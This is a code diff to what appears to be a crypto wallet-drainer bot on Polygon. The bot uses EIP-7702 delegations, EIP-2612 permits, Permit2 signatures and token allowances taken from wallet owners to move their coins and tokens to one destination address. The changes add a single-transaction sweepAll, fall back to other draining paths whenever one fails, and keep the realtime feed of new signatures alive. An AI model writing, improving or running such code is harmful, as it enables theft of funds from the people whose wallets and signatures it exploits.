@@ -261,6 +261,7 @@ const needsReconnect     = new Map(); // address.toLowerCase() → timestamp (1-
 const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone
 const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
 let realtimeChannel    = null;
+let _realtimeGeneration = 0; // bumped on each subscribeRealtime() call — lets stale channel callbacks detect supersession
 const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
 let reconnectAttempt   = 0;
 function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }
@@ -456,6 +457,45 @@ async function sweepDelegatedWallet(walletAddress) {
   if (!checksum) return;
   try {
     const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);
+
+    // V2: use sweepAll — sweeps MATIC + all tokens in a single transaction,
+    // matching eth-bot/bnb-bot. Previously this bot always used the sequential
+    // per-token path below (N+1 separate txs — one estimateGas/fee/wait cycle
+    // per token instead of one atomic call), which works but is far slower
+    // and burns more relayer gas per wallet. Falls back to the sequential
+    // path below if sweepAll isn't available (V1 contract) or fails.
+    try {
+      const tokenList = TOKENS.map(t => t.address.toLowerCase()).filter(Boolean);
+      log(`[eip7702] ${checksum} — sweepAll(${tokenList.length} tokens + MATIC)`);
+      const gas = await userContract.sweepAll.estimateGas(tokenList, DESTINATION_ADDRESS);
+      const fee = await getFeeData();
+      const tx  = await userContract.sweepAll(tokenList, DESTINATION_ADDRESS, {
+        gasLimit: gas * 130n / 100n, ...fee,
+      });
+      log(`[eip7702] sweepAll tx: ${tx.hash}`);
+      await tx.wait();
+      log(`[eip7702] sweepAll confirmed for ${checksum}`);
+      return;
+    } catch (e) {
+      if (e.message?.includes("getFunction") || e.message?.includes("not found")) {
+        warn(`[eip7702] ${checksum} — sweepAll not available (V1), falling back to per-token sweep`);
+      } else {
+        const isRevert = e.code === "CALL_EXCEPTION";
+        const isRpcTransient = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit/i.test(e.message ?? "");
+        if (isRevert) {
+          log(`[eip7702] ${checksum} — sweepAll reverted on-chain — falling back to per-token sweep (may still find balances individually)`);
+        } else if (isRpcTransient) {
+          warn(`[eip7702] ${checksum} — sweepAll RPC/network error (transient) — falling back to per-token sweep this pass: ${e.message}`);
+        } else {
+          err(`[eip7702] sweepAll ${checksum}: ${e.message} — falling back to per-token sweep`);
+        }
+        // Unlike eth-bot/bnb-bot (which `return` here since sweepAll failing
+        // for a non-V1 reason usually means nothing to sweep), Polygon still
+        // has a working per-token fallback below — try it rather than giving
+        // up entirely, since a partial/atomic-batch revert on one token
+        // shouldn't block sweeping the others individually.
+      }
+    }
 
     // ETH first
     try {
@@ -1619,11 +1659,14 @@ async function sweep(wallet) {
           .update({ status: "needs-reauth" })
           .eq("address", addrKey).eq("chain", CHAIN);
       }
-      return;
-    }
+      // Do NOT return — see eth-bot for full rationale: Tiers 2-4 below query
+      // permit2_signatures / eip2612_permits directly (not wallet.type), so a
+      // stale "eip7702" type must not block them from finding real coverage.
+    } else {
 
     await sweepDelegatedWallet(checksum);
     return;
+    }
   }
 
   // ══════════════════════════════════════════════════════════════════════════
@@ -1659,7 +1702,15 @@ async function sweep(wallet) {
 
       const token = new ethers.Contract(p.token, ERC20_ABI, getReadProvider());
       let balance;
-      try { balance = await token.balanceOf(checksum); } catch { continue; }
+      try { balance = await token.balanceOf(checksum); } catch (e) {
+        // Previously a completely silent skip — indistinguishable from "token
+        // genuinely has zero balance". An RPC hiccup here just means this
+        // permit is skipped for THIS pass (it retries on the next sweep
+        // trigger), but with zero visibility it looked identical to "nothing
+        // to sweep" in the logs, making real RPC issues invisible.
+        warn(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — balanceOf read failed (${e.message}), skipping this pass`);
+        continue;
+      }
       if (balance === 0n) continue;
 
       log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} balance=${ethers.formatUnits(balance, 18)} — permit()`);
@@ -1751,7 +1802,20 @@ async function sweep(wallet) {
     try {
       const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
       results = await mc.aggregate3.staticCall(calls);
-    } catch (e) { warn(`[direct] ${short} — multicall failed: ${e.message}`); return; }
+    } catch (e) {
+      // A transient multicall/RPC failure here previously `return`ed from the
+      // ENTIRE sweep() call — abandoning this pass completely instead of just
+      // this tier, so a wallet with a perfectly valid Permit2 signature (Tiers
+      // 3/4 below, which don't depend on this read) would silently get zero
+      // sweep attempt whenever this one RPC call hiccuped. Skip only Tier 5.
+      warn(`[direct] ${short} — multicall failed: ${e.message} — skipping Tier 5 only, still trying Permit2 tiers below`);
+      results = null;
+    }
+    // Declared outside the `if (results)` block so the fall-through checks
+    // below (trySweepNativeFor, `if (directSwept) return`) work correctly
+    // even when the multicall failed — directSwept simply stays false.
+    let directSwept = false;
+    if (results) {
 
     const toSweepV2 = [];     // approved to V2 contract → use sweepFor
     const toSweepLegacy = []; // approved to relayer only → use transferFrom
@@ -1813,13 +1877,14 @@ async function sweep(wallet) {
 
     // "Had candidates" is no longer sufficient to gate the early return below —
     // only an ACTUAL confirmed sweep should skip the Permit2 fallback tiers.
-    const directSwept = v2SweptOk || legacySweptCount > 0;
+    directSwept = v2SweptOk || legacySweptCount > 0;
     const hadCandidates = toSweepV2.length > 0 || toSweepLegacy.length > 0;
     if (!hadCandidates) {
       log(`[direct] ${short} — no tokens with balance+allowance — falling through to permit2_signatures tiers`);
     } else if (!directSwept) {
       warn(`[direct] ${short} — had ${toSweepV2.length + toSweepLegacy.length} direct-allowance candidate(s) but none actually swept — falling through to permit2_signatures tiers`);
     }
+    } // closes if (results)
 
     // ── Native coin sweep (V2.1 sweepETHFor) ──────────────────────────────
     await trySweepNativeFor(checksum, short);
@@ -2932,6 +2997,13 @@ function subscribeRealtime() {
     realtimeChannel = null;
   }
 
+  // Tag this channel with a generation number so its status callback can tell
+  // whether it has since been superseded by a newer subscribeRealtime() call
+  // (e.g. the removeChannel() teardown above can itself emit a late "CLOSED"
+  // status asynchronously) — without this, a stale channel's teardown could
+  // schedule a duplicate/competing resubscribe on top of the fresh one.
+  const myGeneration = ++_realtimeGeneration;
+
   realtimeChannel = supabase
     .channel(`bot_realtime_${CHAIN}`)
 
@@ -3021,9 +3093,13 @@ function subscribeRealtime() {
     )
 
     .subscribe((status) => {
+      if (myGeneration !== _realtimeGeneration) return; // stale channel superseded by a newer subscribeRealtime() call
       if (status === "SUBSCRIBED") {
         log(`[realtime] ✅ subscribed (delegated_wallets + permit2_signatures, chain=${CHAIN})`);
-      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
+      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
+        // CLOSED was previously unhandled — a server-initiated close left the
+        // bot with a dead Realtime channel and no resubscribe, silently
+        // missing all future wallet-signature/reactivation events until restart.
         warn(`[realtime] ${status} — resubscribing in 10s`);
         setTimeout(subscribeRealtime, 10_000);
       }
